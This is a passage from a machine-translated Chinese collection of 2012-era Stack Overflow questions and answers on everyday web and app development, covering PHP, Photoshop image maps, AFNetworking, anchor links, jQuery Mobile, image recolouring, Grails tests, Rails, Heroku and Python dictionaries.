    var filename = <%php $filename %>;
</script> 
```

================ 编辑 ==========================

```
<%php // This is your processing script 
     ... Your processing logic ...

     // After processing, add a variable called filename to session.
     session_start();
     $_SESSION['filename'] = $filename;

     header('Location: /newPhpScript.php');

%> 
```

-- 然后你的新 php 脚本可能看起来像这样：

```
<%php session_start() %>
<html>
    <body>
        <script>
           // if using jQuery
            var filename = $('#filename').text();
           // else use this
            var filename = document.getElementById('filename').innerHTML;
        </script>
        <span id="filename" style="display: none"><%php echo $_SESSION['filename'] %></span>
    </body>
</html> 
```

# photoshop - 如何获取用于图像映射的形状的路径坐标？

> ID：13845958
> 
> 赞同：19
> 
> 时间：2012-12-12T18:08:58.570
> 
> 标签：photoshop, imagemap, adobe-illustrator, imagemapster

我正在使用`ImageMapster` [from here](http://www.outsharked.com/imagemapster/default.aspx?demos.html)创建图像映射。

我用从原始照片中剪下的几张图像创建了一个 Photoshop 图像。每个图像都在一个单独的层上。

现在，我需要获取每个对象的路径坐标，我不想将鼠标悬停在每个角落并手动记下每个坐标。

有没有一种自动化的方式来获取这条路径？

也许有一些应用程序或网络服务可以发送我的图像并获得路径作为回报？

我曾尝试分别导出每一层，然后将它们导入到 illustrator 中并对形状进行矢量化（它将形状保持在其原始位置），但我不知道如何将坐标路径作为文本获取。我可以将其导出为 svg，但这与 css 图像映射所需的简单代码不同。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-12-12T20:10:47.040

啊! 谷歌搜索后`image-map`，非常感谢 Sven 的想法（他得到了我的 +1），我[在 Stack Overflow 上找到了这个线程](https://stackoverflow.com/questions/3833052/illustrator-map-to-imagemap-automatically-or-is-there-a-better-way)。

所以这是我的过程。

1.  在 Photoshop 中准备图像，将每个对象放在具有透明背景的单独图层上（这将使您在进行跟踪时更容易）。
2.  保存您的 Photoshop 文件。
3.  *使用File...Open*在 Illustrator 中打开 Photoshop 文件（适用于 CS4 和 CS5），并确保允许将 Photoshop 图层作为单独对象导入的选项。打开文件后，请确保不要移动任何对象 - 您需要将它们与它们在 photoshop 文件中的*位置完全相同*，以便在渲染到图像映射时它们可以相互叠加。
4.  使用`Live Trace`自定义设置。使用阈值全部向上 (255) 的黑白模式。这将产生形状的黑色轮廓。（您也可以使用“忽略白色”）。按下`Trace`按钮。如果你有很多层，你可以把这个新的描摹图案保存为预设——我叫我的，*剪影*。现在，我只需单击一个图层并从跟踪按钮的下拉菜单中选择*剪影。*![Adobe Illustrator 描摹设置](../Images/b723700af9ceb4ee0772bb5a411809ed.png)
5.  展开形状并确保它仅包含一个平面形状：
    *   您可以使用 illustrator 中的斑点画笔将任何不需要的白色区域变黑
    *   **没有组**
    *   **没有复合形状**（或者它不起作用）——这意味着你不能创建切口。
    *   当您单击形状时，您可以判断它们是正确的 - 您应该能够看到路径本身，不涉及任何“其他”形状（可能是 blob 笔刷添加） - 只有一条路径。一个简单的方法是这样的：
        *   `select`形状
        *   `ungroup`如有必要
        *   `release compound path`
        *   `unite`（形状模式将所有形状合并为一个）
    *   不要`crop`你的图像 - 你希望你的形状在图像区域中与原始 Photoshop 图像中的位置相同。
    *   也不要将所有形状连接在一起。
    *   这些形状都应该是单独的整体形状，都在它们的原始位置，每个都在一个单独的层上。
6.  现在，打开 Illustrator 的`Attributes panel`，并确保“显示选项”。
7.  选择您的形状，然后在“属性”面板中，将“图像映射”组合框从`None`切换到`Polygon`。确保添加一个 url（你放什么并不重要；你可以稍后更改它 - 我只是放了“#”和形状的名称，这样我就可以在图像映射代码中判断它属于哪个）![在此处输入图像描述](../Images/95e43cdee0e7d8e0bc7d04b1f2cfc30f.png)
8.  对每个对象执行此操作。
9.  现在，在`File`菜单中，转到“保存为 Web 和设备”。跳过此处的所有设置，然后按“保存”。
10.  在“另存为”（窗口标题为“优化另存为”）对话框中，使用“另存为类型：”并选择`HTML Only(*.html)`是否只需要代码，或者`HTML and Images`是否也需要 sillouhuette（它们会出现在一个名为“图像”的文件夹中） - 并记下您的保存位置。![在此处输入图像描述](../Images/eefc6e465d946286af38b79151edf90c.png)
11.  现在在记事本中打开那个 html 文件！
12.  **瞧！**所有的形状都会以预制的`image-map`点路径甚至 html 代码的形式呈现给您。以下是您在记事本中打开刚刚创建的 html 文件时的样子：![在此处输入图像描述](../Images/161df740ecde661cb364f47628627ba9.png) 对于这个演示，我选择了一个特别复杂的图像 - 您永远不想手动估计，也不必做两次！

不要忘记将实际图像文件放在您网站的图像文件夹中的某个位置。您可以保存 psd 文件以供以后使用，并根据需要添加更多“东西”，然后重复该过程。

我能够在短短几分钟内以这种方式为我的 Photoshop 图片创建图像映射。做一次之后，下次就容易多了。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-06-09T11:54:45.563

这一直困扰着我很长时间，我没有 Illustrator 能够使用 BGM 提出的解决方案，我创建了自己的 Photoshop 插件。

你可以在这里得到它：[https ://creative.adobe.com/addons/products/2389](https://creative.adobe.com/addons/products/2389)

它将所有路径点的坐标写入文本文件。应该适用于 CS6 及更高版本。

我使用它的方式是创建一个选框，右键单击 -> 制作工作路径，重命名我的路径，[重复]，然后通过我的插件导出坐标。

如果有人对它背后的脚本感兴趣，你可以看看这里： http: [//pastebin.com/8ugcAV3j](http://pastebin.com/8ugcAV3j)

如果您有任何改进，请在此处发布，以便其他人也可以使用它们。

希望这可以帮助某人。

编辑：添加到源脚本的链接（之前只在评论中）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-08-06T15:25:46.717

我用它来查找形状轮廓的坐标，以便为 Dreamweaver 中的链接制作图像热点。如果您有其他想法，那么您将不得不忽略其中的一些。这适用于单层，因此您可能希望先制作“平面副本”，但我不明白为什么它不适用于多层图像。

使用魔杖突出显示您想要的区域。这对于不同的图像会有所不同。右键单击并点击制作工作路径。使用通过反复试验找到的合适公差。我只用最敏感的。对所有图像中的所有区域执行此操作，为每个区域创建单独的路径。单击编辑，然后将路径导出到 Illustrator 并将文件保存在合理的位置。用word打开保存的文件。忽略顶部的凹凸并使用替换删除所有字母。不要担心段落字符。请注意，所有工作路径都导出在由空行分隔的同一文件中，因此必须分别复制和粘贴才能用于每个热点。

插入图像后。开始在dreamweaver 中制作带有几个坐标的地图，然后简单地将这些坐标替换为要生成的每个地图区域的Illustrator 文件中的信息。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-04-18T05:32:33.357

我添加了我必须找到的更新答案，因为 adobe 在许多情况下都消除了 HTML 输出，我主要使用 Photoshop（CS4），这是一个完美的解决方案：

1）下载以下文件：[https ://github.com/andyhawkes/ps-paths-to-imagemap](https://github.com/andyhawkes/ps-paths-to-imagemap)

2) 在 Photoshop 中打开您的图像并使用魔杖选择表格

3）右键单击并选择“制作工作路径”（像素越小，越准确）

4) 转到`File`-> `Scripts`->`Browse ...`并选择第一步中的脚本

就是这样 ！！此脚本将使用坐标打开您的文本编辑器...

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-25T09:18:02.520

像这样的东西可能有用；

[http://code.google.com/p/imagemap/](http://code.google.com/p/imagemap/)

将图像复制到适当位置，然后进行绘图。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2013-07-29T14:35:58.117

创建图像映射非常简单。首先我们需要看一下代码的语法让我们创建一个div。如果我们想将它定位在页面的右侧，我们可以从编写开始

```
<div align="right"> 
```

之后，我们导入要映射的图像。

```
<img src="" alt="" width="" height="" usemap="#nameofmap" /> 
```

现在我们必须定义地图结构。首先让我们假设您希望图像的矩形部分充当超链接。

```
<map name="nameofmap">
<area href="wherever I wanna take that.com" alt="" title="" 
shape=rect coords="A,B,C,D"></map> 
```

现在我们关闭 div。

```
</div> 
```

如果形状是圆形，我们使用语法 **shape=circle coords="x,y,radius"**

如果形状是多边形，我们使用 **shape=poly coords="a,b,c,d,e,f,gh"

现在到了重要的部分：如何找到图像映射坐标。很简单。去 [http://www.image-maps.com](http://www.image-maps.com) 浏览你的图像文件，点击“开始映射你的图像”，然后你继续，然后在下一页，点击右侧的“导入旧映射代码” .然后你得到坐标。

之后，您可以根据您的要求使用 FIREBUG 更改坐标，因为 image-maps 仅超链接整个图像，因此使用 firebug 更改坐标并根据您的要求进行调整。

玩得开心。

# afnetworking - 无法使用 AFNetworking 上传图片

> ID：13845963
> 
> 赞同：0
> 
> 时间：2012-12-12T18:09:15.230
> 
> 标签：afnetworking, rubymotion

我正在使用 Rubymotion 创建一个 iOS 应用程序。我正在尝试对图像进行分段上传。

*我使用此代码进行上传，但出现错误：*

```
data = {token: "2xCGdzcuEeNzhst3Yaa8f", task: 1, message: "message", latitude: 1, longitude: 1}

    client = AFHTTPClient.alloc.initWithBaseURL(NSURL.URLWithString("http://api.example.com/api/v1/"))

        request = client.multipartFormRequestWithMethod('POST', path:"messages", parameters:data, constructingBodyWithBlock:lambda{ |form_data|
          image_data = UIImagePNGRepresentation(image.image)
          form_data.appendPartWithFileData(image_data, name:'new_avatar', fileName:'new_avatar.png', mimeType:'image/png')
        })

        operation = AFJSONRequestOperation.alloc.initWithRequest(request)
        operation.setCompletionBlockWithSuccess(lambda{ |operation, responseObject| puts 'all done!'}) 
```

*我收到此错误：*

```
undefined method `setCompletionBlockWithSuccess' for #<AFJSONRequestOperation:0xb227f00> (NoMethodError) 
```

从我所见，操作是一个有效的对象，应该有这个方法。我在这里错过了什么吗？

**更新 1**

这是我更新的代码，但是当我运行它时，POST 操作似乎没有触发。我还缺少任何代码吗？我也没有收到任何错误。

```
data = {token: "2xCGdzcuEeNzhs5tYaa8f", task: 1, message: "message", latitude: 1, longitude: 1}

    client = AFHTTPClient.alloc.initWithBaseURL(NSURL.URLWithString("http://api.example.com/api/v1/"))

    request = client.multipartFormRequestWithMethod('POST', path:"messages", parameters:data, constructingBodyWithBlock:lambda{ |form_data|
      image_data = UIImagePNGRepresentation(image.image)
      form_data.appendPartWithFileData(image_data, name:'new_avatar', fileName:'new_avatar.png', mimeType:'image/png')
    })

    operation = AFJSONRequestOperation.alloc.initWithRequest(request)
    operation.setCompletionBlockWithSuccess(lambda { |operation, responseObject| puts 'all done!'},
                                            failure: lambda { |operation, error| puts 'error' }) 
```

*请求对象输出：*

```
<NSMutableURLRequest:195641792 - url: http://api.example.com/api/v1/messages, 
    headers: {"Content-Length"=>"118200", "Content-Type"=>"multipart/form-data; boundary=Boundary+0xAbCdEfGbOuNdArY", "Accept-Language"=>"en, fr, de, ja, nl, it, es, pt, pt-PT, da, fi, nb, sv, ko, zh-Hans, zh-Hant, ru, pl, tr, uk, ar, hr, cs, el, he, ro, sk, th, id, ms, en-GB, ca, hu, vi, en-us;q=0.8", "User-Agent"=>"theapp/1.0 (iPhone Simulator; iOS 6.0; Scale/1.00)"}, 
    cache policy: 0, Pipelining: false, main doc url: ,    timeout: 60.0, network service type: 0 > 
```

*操作对象输出：*

```
<AFJSONRequestOperation:0xa78c660> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T23:44:26.393

方法签名是`setCompletionBlockWithSuccess(lambda..., failure: lambda...)`——你需要添加一个失败参数。像这样的东西：

```
operation.setCompletionBlockWithSuccess(lambda { |operation, responseObject| puts 'all done!'},
                                        failure: lambda { |operation, error| puts 'error' }) 
```

此外，您需要确保实际启动请求操作：

```
operation.start 
```

有关此方法的定义，请参见[https://github.com/AFNetworking/AFNetworking/blob/master/AFNetworking/AFJSONRequestOperation.m#L102-L103 。](https://github.com/AFNetworking/AFNetworking/blob/master/AFNetworking/AFJSONRequestOperation.m#L102-L103)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T18:45:18.363

我写了一个类来做这种工作。[在这里](https://stackoverflow.com/questions/10618056/how-to-post-more-parameters-with-image-upload-code-in-ios)查看我的答案。它使用 AFNetworking 并包含基本网络请求的方法。

# javascript - 如何指定锚标记的行为类似于超链接，没有 href 和锚名称？

> ID：13845968
> 
> 赞同：0
> 
> 时间：2012-12-12T18:09:21.410
> 
> 标签：javascript, html, hyperlink, onclick, anchor

好的，所以这个有一些类似的线程，但我找不到任何能把它钉在头上的东西，所以我们开始吧。

我正在尝试使用锚标记模拟链接，如下所示：

```
<a onClick="javascript: DownloadPorn();">Click Here!</a> 
```

所有这一切都很好，花花公子；链接显示，我可以点击它，我的javascript方法成功执行。

这里的问题是，如何正确强制链接以与实际“HTML 链接”“相同的方式”显示？或者更确切地说，以“相同的方式”，就好像我在上述标签中有一个 href；像这样：

```
<a href="#" onClick="javascript: DownloadMorePorn();">Click Here!</a> 
```

现在...此代码片段强制链接以我期望的方式显示，但在使用此方法时，当单击链接时，滚动位置会弹回顶部。

可能很清楚，这不是我正在尝试开发的框架的预期行为。如果有人对克服这个特定问题有任何建议，我将非常感谢您的意见。

--- 在全部输入时，我认为我可以在屏幕顶部放置一个静态锚点（比如 0,0 或 -,- ），并强制我的所有链接引用该锚点。如果有人在此解决方案中看到任何可行性，我可能会对其进行探索。

--- 已编辑 ---

接受的答案：

为了让锚点充当超链接，而不操纵浏览器的当前位置；利用 Javascript 方法在 href 属性中返回任何内容（？），或在锚点的备用事件处理程序之一（即 onClick 方法）中有效返回“false”。

可能的解决方案：

```
<a href="javascript: DoSomething();">Link</a>
<a href="javascript: void(0);" onClick="javascript: DoSomething();">Link</a>
<a href="#" onClick="javascript: DoSomething(); return false;">Link</a> 
```

再次感谢大家。

--- 结束编辑 ---

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:33:03.877

如果您`return false`在 onclick 属性的末尾使用它，它不会使其滚动到任何地方。

```
<a href="#" onClick="someFunc(); return false;">Click Here!</a> 
```

或者您可以让您的函数返回 false，并返回其结果 (false) 并在更短的 onclick 属性中执行它：

```
<script type="text/javascript">
function someFunc() {
    // all your function code here
    return false;
}
</script>
<a href="#" onClick="return someFunc()">Click Here!</a> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:13:14.260

设置`href`为`javascript:void(0);`，这将意味着浏览器显示链接，就好像它有一个真实的`href`：

```
<a href="javascript:void(0);" onClick="javascript: DownloadBooks();">Click Here!</a> 
```

还有其他方法，例如将 href 设置为`#`，但显示的一种方法的优点是您不必担心返回 false 或指定`return DownloadBooks()`。

[这个问题](https://stackoverflow.com/questions/134845/href-attribute-for-javascript-links-or-javascriptvoid0)有一些关于使用的好信息`javascript:void(0)`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T18:15:33.380

将javascript函数设置为href。

```
<a href="javascript:DownloadPorn();">Click Here!</a> 
```

编辑：只是要注意一些人认为这是不好的做法。

# jquery - 自动换行 jquery listview 项

> ID：13845970
> 
> 赞同：2
> 
> 时间：2012-12-12T18:09:35.200
> 
> 标签：jquery, jquery-mobile

我有一个包含近 100 个字符的项目的 Listview，但我需要显示全文，我该怎么做？

```
 <ul data-role="listview" data-filter="true" data-inset="true">
            <li data-filtertext="Hola" data-theme="b"><a href="" >Hola</a></li>
            <li data-filtertext="mundo"><a href="" >mundomundomundomundomundo mundo mundomundomundomundomundo  mundomundomundo  mundomundomundo mundomundomundomundomundomundomundo mundomundomundo</a></li>
            <li data-filtertext="hello"><a href="" >hello</a></li>
            <li data-filtertext="world"><a href="" >world</a></li>
        </ul> 
```

[JSF中间代码](http://jsfiddle.net/jupagose/eFvzC/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T18:13:34.997

您需要`white-space :nowrap`从规则`.ui-li .ui-btn-text a.ui-link-inherit`中删除`.ui-btn-inner`

或用`white-space:normal!important;`

不确定这是否会在更大的应用程序中引起副作用..

演示在[http://jsfiddle.net/gaby/eFvzC/1/](http://jsfiddle.net/gaby/eFvzC/1/)

* * *

如果您想避免内联样式，您可以根据`data-filtertext`值直接定位元素（*对于现代浏览器*）

```
.ui-li[data-filtertext="mundo"] .ui-btn-text a.ui-link-inherit{
   white-space:normal!important;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:17:26.800

您可以使用仅修改`white-space`属性

例如

```
<ul data-role="listview" data-filter="true" data-inset="true">
        <li data-filtertext="Hola" data-theme="b"><a href="" >Hola</a></li>
        <li data-filtertext="mundo"><a style="white-space: pre-wrap;" href="" >mundomundomundomundomundo mundo mundomundomundomundomundo  mundomundomundo  mundomundomundo mundomundomundomundomundomundomundo mundomundomundo</a></li>
        <li data-filtertext="hello"><a href="" >hello</a></li>
        <li data-filtertext="world"><a href="" >world</a></li>
    </ul> 
```

当然，避免使用内联样式可能会更好，而且您最好只在要自定义样式的列表项中添加一个类......

# image - 图像的选择性颜色

> ID：13845973
> 
> 赞同：1
> 
> 时间：2012-12-12T18:09:51.753
> 
> 标签：image, colors

我有超过 1 周的时间阅读有关图像的选择性颜色变化的信息。这意味着从颜色选择器中选择一种颜色，然后选择我想要更改颜色的图像的一部分，并将颜色从原始颜色的变化应用于颜色选择器的颜色。

例如，如果我在颜色选择器中选择了蓝色并且我还选择了图像中的红色部分，我应该能够在所有图像中将红色更改为蓝色。

另一个例子。如果我有一个带有红色苹果和橘子的图像，并且如果我在图像上选择了一个苹果，并且在颜色纠察队中选择了一个蓝色，那么所有苹果都应该将颜色从红色变为蓝色。

我有一些想法，但当然我需要更具体的关于如何做到这一点

感谢您阅读

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-13T19:00:05.477

作为起点，请考虑对图像的颜色进行聚类。如果您不知道想要多少个集群，那么您将需要确定是否合并两个给定集群的方法。目前，让我们假设我们知道这个数字。例如，给定下图左侧，我将它的颜色映射到 3 个簇，它们的平均颜色如中间所示，并用平均颜色表示每个簇，得到右图。

![在此处输入图像描述](../Images/be27aec7819ccf7fd476436479369061.png) ![在此处输入图像描述](../Images/28e5d7df906b1d8440fcdb4da684b65d.png) ![在此处输入图像描述](../Images/d4905d470a4940824c84aed9af291209.png)

有了右边的输出，现在你需要的是一种替换颜色的方法。假设用户单击图像中的某个位置（单个点），那么您知道原始图像中需要修改的位置。对于下一张图片，用户（我）点击了包含在“橙色”集群中的一个点。然后他点击了一些蓝色调。从那开始，您制作一个代表“橙色”集群中的点的蒙版并使用它。我考虑了一个简单的高斯滤波器，然后是一个 3x5 的扁平膨胀。然后根据生成的蒙版替换原始图像中的色调（经过低通滤波后，其上的值也被视为合成图像的 alpha 值）。

![在此处输入图像描述](../Images/de9e98ca46832010bd871c30c429b9fa.png)

一点也不完美，但你可以有比我更好的聚类，还有一种不那么原始的颜色替换方法。我故意跳过了关于聚类方法、颜色空间等的细节，因为我只在 RGB 上使用了基本的 k-means，没有对输入进行任何预处理。因此，您可以将上述结果视为您可以做的任何其他事情的基准。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T02:52:37.223

给定图像、选定的颜色和目标新颜色 - 你不能做很多不丑陋的事情。您还需要一个范围，一些颜色的变化，因此您可以说一个像素的颜色“足够接近”，而另一个像素的颜色显然“不同”。

处理的第一步：创建一个蒙版图像，它是灰度的，从 0.0 到 1.0（或从零到某个最大值，我们将视为 1.0）变化，并且与输入图像的大小相同。对于每个输入像素，测试其颜色是否足够接近所选颜色。如果它“相同”或“足够接近”，则将 1.0 放入掩码中。如果不同，则输入 0.0。如果是分界线，则放置一个中间值。究竟如何做到这一点取决于图像的细节。

这可能在 LAB 空间中效果最好，并根据 A、B 坐标相对于其原点的角度测试相同性。

拿到口罩后，把它放在一边。现在对整个图像进行颜色转换。这可能最好在 HSV 空间中完成。请勿触摸 V 通道。向 S 添加一个常数，模 360 度（或模 256，如果 S 存储为字节）并将 S 乘以选择的常数，以便与所选颜色对应的 HSV 中的坐标移动到目标颜色的 HSV 坐标。将 L 不变的变换后的 S 和 H 转换回 RGB。

最后，使用蒙版将原始图像与经过颜色转换的图像混合。将此应用于每个通道 - 红色、绿色、蓝色：

```
output = (1-mask)*original + mask*transformed 
```

如果你在字节数组中做这一切，0 是 0.0 和 255 是 1.0，并小心溢出和有符号/无符号问题。

# unit-testing - Grails 单元测试中的 grails 应用程序访问

> ID：13845975
> 
> 赞同：9
> 
> 时间：2012-12-12T18:10:02.127
> 
> 标签：unit-testing, grails, config

我正在尝试为使用 grailsApplication.config 进行一些设置的服务编写单元测试。似乎在我的单元测试中，服务实例无法访问其设置的配置文件（空指针），而当我运行“run-app”时它可以访问该设置。如何在单元测试中配置服务以访问 grailsApplication 服务。

```
class MapCloudMediaServerControllerTests {

    def grailsApplication

    @Before
    public void setUp(){
        grailsApplication.config= 
        '''
   video{
   location="C:\\tmp\\"  // or shared filesystem drive for a cluster

    yamdi{
        path="C:\\FFmpeg\\ffmpeg-20121125-git-26c531c-win64-static\\bin\\yamdi"  
         }

    ffmpeg  {
        fileExtension = "flv"  // use flv or mp4
        conversionArgs = "-b 600k -r 24 -ar 22050 -ab 96k"
        path="C:\\FFmpeg\\ffmpeg-20121125-git-26c531c-win64-static\\bin\\ffmpeg"
        makethumb = "-an -ss 00:00:03 -an -r 2 -vframes 1 -y -f mjpeg"
    }

    ffprobe {
        path="C:\\FFmpeg\\ffmpeg-20121125-git-26c531c-win64-static\\bin\\ffprobe" 
        params=""
    }

    flowplayer {
        version = "3.1.2" 
    }

    swfobject {
        version = "" 

    qtfaststart {
        path= "C:\\FFmpeg\\ffmpeg-20121125-git-26c531c-win64-static\\bin\\qtfaststart" 
    } 
}   '''
    }

@Test
    void testMpegtoFlvConvertor() {

        log.info "In test Mpg to Flv Convertor function!"

        def controller=new MapCloudMediaServerController()
        assert controller!=null

        controller.videoService=new VideoService()  
        assert controller.videoService!=null

        log.info "Is the video service null? ${controller.videoService==null}"

        controller.videoService.grailsApplication=grailsApplication

        log.info "Is grailsApplication null? ${controller.videoService.grailsApplication==null}"

        //Very important part for simulating the HTTP request
        controller.metaClass.request = new MockMultipartHttpServletRequest()
        controller.request.contentType="video/mpg"
        controller.request.content= new File("..\\MapCloudMediaServer\\web-app\\videoclips\\sample3.mpg").getBytes()

        controller.mpegtoFlvConvertor()

        byte[] videoOut=IOUtils.toByteArray(controller.response.getOutputStream())
        def outputFile=new File("..\\MapCloudMediaServer\\web-app\\videoclips\\testsample3.flv")
        outputFile.append(videoOut) 
    }
} 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-12T18:21:14.653

如果您使用`@TestFor`Grails (2.0) 已经为您模拟 grailsApplication，只需设置您的配置，但不要声明 grailsApplication。这样做会覆盖模拟实例。

```
@TestFor(MyService)
class MyServiceTests {

  @Before
  public void setUp() {
    grailsApplication.config.something = "something"
  }

  @Test
  void testSomething() {
    MyService service = new MyService()
    service.grailsApplication = grailsApplication
    service.doSomething()
  }

} 
```

**编辑**：

您声明了一个`String`，要添加到配置中，您必须解析它。请参阅[此处](http://mrhaki.blogspot.com.br/2009/10/groovy-goodness-using-configslurper.html)的示例。

基本上，您使用`ConfigSlurper().parse()`来获取`ConfigObject`，并使用`grails.config.merge()`将内容添加到配置中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-12-06T07:26:32.433

[使用DefaultGrailsApplication](https://github.com/grails/grails-core/blob/master/grails-core/src/main/groovy/org/codehaus/groovy/grails/commons/DefaultGrailsApplication.java#L103)构建 grailsApp会起作用。

```
class ZazzercodeUnitTestCase extends GrailsUnitTestCase {
    def grailsApplication = new org.codehaus.groovy.grails.commons.DefaultGrailsApplication()
    def chortIndex= grailsApplication.config.zazzercode.chortIndex
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-09-26T15:49:20.827

转到[http://ilikeorangutans.github.io/2014/02/06/grails-2-testing-guide](http://ilikeorangutans.github.io/2014/02/06/grails-2-testing-guide)

> Grails 的配置通常使用 config 属性通过注入的 GrailsApplication 实例进行访问。Grails 将 GrailsApplication 注入到单元测试中，因此您可以直接访问它：

```
@TestMixin(GrailsUnitTestMixin)
class MySpec extends Specification {        
    private static final String VALUE = "Hello"
    void "test something with config"() {
        setup:
        // You have access to grailsApplication.config so you can 
        //modify these values as much as you need, so you can do
        grailsApplication.config.myConfigValue = VALUE

        assert:             
        grailsApplication.config.myConfigValue == VALUE
    }

} 
```

# ruby-on-rails - 如何在 Rails 上显示一篇文章 ruby 的链接？

> ID：13845976
> 
> 赞同：1
> 
> 时间：2012-12-12T18:10:01.193
> 
> 标签：ruby-on-rails

我正在尝试在我的 rails 应用程序的主页上显示一篇文章的链接

这是html代码：

```
 <% @articles.each do |article| %> 
        <%= link_to 'Show', article %>
      <% end %> 
```

这是我的控制器：

```
class StaticPagesController < ApplicationController
  def home
@user = current_user
@articles = Article.all
  end

  def comics
 end
end 
```

它显示在我的主页中，但显示如下

```
show show 
```

因为我现在有两篇文章......我理解它是因为每一篇都这样做，并且它会抓取所有文章并将其吐出到我的观点中，但我该怎么做才能只显示指向特定文章的链接？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:26:44.090

`link_to`使用由一组选项创建的 URL 创建给定**名称的链接标记。**因此，如果您将代码更改为如下所示，前提是该文章响应名为 title 的方法，该方法返回一个字符串：

```
<% @articles.each do |article| %>
  <%= link_to article.title, article %>
<% end %> 
```

然而，`article.title`这只是一个例子，如果文章没有`title`方法也很好。您可以在那里使用任何字符串来帮助您识别不同的链接。

阅读[API 文档](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-link_to)以获取更多选项。

如果您想显示特定文章的一个链接，那么您可以在控制器中执行以下操作：

```
@article = Article.find(params[:article_id]) 
```

哪里`article_id`来作为参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:27:44.980

您的意思是显示单个记录而不是所有文章？

如果是这样，只需从控制器返回一个。

```
def home
  .....
  @article  = Article.first 
end 
```

然后就 `link_to 'show', @article`

您可以将 Article.first 替换为但是您希望限制为要显示的特定文章

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T18:28:26.447

如果要显示特定文章，则需要在控制器中定义一个包含特定文章的实例变量，而不是所有文章 ( `Article.all`)

```
@article = Article.first 
```

或者

```
@article = Article.find(id) # where id is the id of a specific article 
```

然后，在您看来，而不是每个块，只需拥有

```
<%= link_to 'Show', @article %> 
```

# heroku - Heroku：bash：bundle：找不到命令

> ID：13845980
> 
> 赞同：1
> 
> 时间：2012-12-12T18:10:22.580
> 
> 标签：heroku, ruby-on-rails-3.2, ruby-1.9.2, cedar

我的 heroku 部署因以下错误而崩溃。

```
2012-12-12T17:16:18+00:00 app[web.1]: bash: bundle: command not found
2012-12-12T17:16:19+00:00 heroku[web.1]: Process exited with status 127
2012-12-12T17:16:19+00:00 heroku[web.1]: State changed from starting to crashed 
```

此错误的 Heroku 文档是设置 PATH 和 GEM 变量，如[https://devcenter.heroku.com/articles/changeing-ruby-version-breaks-path](https://devcenter.heroku.com/articles/changing-ruby-version-breaks-path)中所述，我试过了，但这也无济于事。

```
→ heroku config:add PATH=bin:vendor/bundle/ruby/1.9.1/bin:/usr/local/bin:/usr/bin:/bin
→ heroku config:add GEM_PATH=vendor/bundle/ruby/1.9.1
→ heroku run rake db:migrate
Running rake db:migrate attached to terminal... up, run.7130
bash: bundle: command not found 
```

**接下来，我尝试在我的 Heroku 应用程序中设置 Ruby 版本。这增加了蛞蝓大小。但是应用程序仍然没有启动。**

宝石文件

```
ruby "1.9.2" 
```

推送到 Heroku

```
-----> Using Ruby version: ruby-1.9.2
-----> Installing dependencies using Bundler version 1.2.2 
```

heroku 运行“ruby -v”

```
Running `ruby -v` attached to terminal... up, run.4483
ruby 1.9.2p320 (2012-04-20 revision 35421) [x86_64-linux] 
```

有人可以请教

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T22:12:02.460

该错误是因为您的路径不正确。

1.  如果你尝试使用 Ruby 1.9.3，你不需要做任何事情，它是默认的 Ruby，所以你可以删除那些配置变量。
2.  如果您使用的是 1.8.7 或 1.9.2，请升级到 1.9.3，因为它是最新的。
3.  If you're looking at using Ruby 2.0.0.p3 - you're on your own ;)

# python - 是否可以对字典中的单个元素使用多个键？

> ID：13845981
> 
> 赞同：0
> 
> 时间：2012-12-12T18:10:33.750
> 
> 标签：python, dictionary

我正在编写自己的函数，用于将 XML 文本解析为可以操作并呈现回 XML 文本的对象。为了处理嵌套，我允许 XML 对象包含其他 XML 对象作为元素。

由于我会自动生成这些 XML 对象，因此我的计划是在创建它们时将它们作为 dict 的元素输入。我计划生成一个名为 name 的属性，我可以将其用作键，并让 XML 对象本身成为分配给该键的值。

在这一点上，所有这些对我来说都是有意义的。但是现在我意识到我真的很想保存一个名为 的属性`line_number`，这将是我第一次遇到该对象的原始 XML 文件中的行，并且可能在某些情况下我想通过 定位 XML 对象`line_number`，而不是名字。

所以这些是我的问题：

1.  是否可以使用字典，以便我可以通过名称或行号找到我的 XML*对象*？也就是说，是否可以将多个键分配给字典中的单个值？
2.  我怎么做？
3.  如果这是一个坏主意，有什么更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:13:04.360

对的，这是可能的。不需要特殊的魔法：

```
In [1]: val = object()

In [2]: d = {}

In [3]: d[123] = val

In [4]: d['name'] = val

In [5]: d
Out[5]: {123: <object at 0x23c6d0>, 'name': <object at 0x23c6d0>} 
```

但是，我会使用两个单独的字典，一个用于按名称索引，另一个用于按行号索引。即使名称和行号的集合完全不相交，我认为这是一种更简洁的设计。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T18:13:32.603

```
my_dict['key1'] = my_dict['key2'] = SomeObject 
```

我认为应该可以正常工作

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T18:15:14.930

由于字典可以有多种类型的键，并且您使用名称（仅限字符串）作为一个键，使用数字（仅限整数）作为另一个键，您可以简单地使两个单独的条目指向同一个对象 - 一个用于数字，一个用于为字符串。

`dict[0] = dict['key'] = object1`

# javascript - Ember StateManager 未准确反映 currentState

> ID：13845986
